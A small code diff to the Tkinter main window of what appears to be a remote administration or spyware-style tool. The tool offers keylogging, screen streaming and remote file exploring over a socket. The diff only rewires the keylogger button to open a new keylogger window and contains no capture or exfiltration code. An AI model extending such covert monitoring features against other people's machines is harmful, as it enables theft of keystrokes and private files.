@@ -4,6 +4,7 @@ import ui.label as lb
 import queue
 
 import ui.ui_screenStream as sc
+import ui.ui_keylogger as kl
 
 class UI_main(tk.Tk):
     def __init__(self):
@@ -91,7 +92,9 @@ class UI_main(tk.Tk):
         window.focus()
 
     def keylogger(self):
-        self.socket_cmd("keylogger")
+        window = kl.UI_keylogger(self)
+        window.grab_set()
+        window.focus()
 
     def fileExplorer(self):
         self.socket_cmd("fileExplorer")
